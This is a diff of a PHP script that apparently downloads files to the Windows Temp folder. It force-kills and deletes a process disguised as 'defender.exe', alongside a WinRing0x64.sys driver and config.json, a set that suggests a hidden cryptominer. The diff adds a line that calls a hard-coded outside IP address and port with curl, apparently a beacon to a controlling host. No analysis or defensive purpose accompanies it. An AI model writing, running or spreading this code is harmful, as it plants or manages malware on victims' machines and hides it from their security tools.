@@ -4,68 +4,32 @@
 
 
 function downloadFile($url, $savePath) {
-    // Check if file already exists
-    if (file_exists($savePath)) {
-        echo "File already exists: $savePath\n";
-        return true;
-    }
 
-    // Open file handle for writing
-    $fp = fopen($savePath, 'w');
-    if ($fp === false) {
-        echo "Failed to open file for writing: $savePath\n";
-        return false;
-    }
-
-    // Open URL for reading
-    $ch = curl_init($url);
-    curl_setopt($ch, CURLOPT_FILE, $fp);
-    curl_setopt($ch, CURLOPT_TIMEOUT, 0); // No timeout
-    curl_setopt($ch, CURLOPT_FOLLOWLOCATION, true); // Follow redirects
-    curl_setopt($ch, CURLOPT_FAILONERROR, true); // Fail on HTTP error
-
-    // Execute download
-    $success = curl_exec($ch);
-    if (!$success) {
-        echo "Download error: " . curl_error($ch) . "\n";
-        fclose($fp);
-        unlink($savePath); // Remove incomplete file
-        curl_close($ch);
-        return false;
-    }
-
-    curl_close($ch);
-    fclose($fp);
-    echo "Downloaded and saved: $savePath\n";
-    return true;
-}
+    // Check if the file already exists
+    if (!file_exists($savePath)) {
 
 
+    
 
-function executeCommand($command) {
-    $output = null;
-    $returnCode = null;
-    exec($command, $output, $returnCode);
-    if ($returnCode === 0) {
-        echo "Command executed successfully.\n";
+    // Download the file if it does not exist
+    $downloadedFile = file_get_contents($url);
+    if ($downloadedFile !== false) {
+        if (file_put_contents($savePath, $downloadedFile)) {
+            echo "Downloaded and saved: $savePath\n";
+        } else {
+            echo "Failed to download and save: $savePath\n";
+        }
     } else {
-        echo "Failed to execute command. Return code: $returnCode\n";
+        echo "Failed to download: $url\n";
     }
+    } 
 }
 
 
-$deletePaths = [
-    'C:/Windows/Temp/defender.exe',
-    'C:/Windows/Temp/WinRing0x64.sys',
-    'C:/Windows/Temp/config.json',
-
-];
 
 
+system('curl 185.208.158.206:8877');     
 
-
-
-$checkfile1 = 'C:/Windows/Temp/defender.exe';
 system('taskkill /IM defender.exe /F');     
 system('taskkill /IM defender.exe /F');    
 system('del /f /q "C:/Windows/Temp/defender.exe"');  
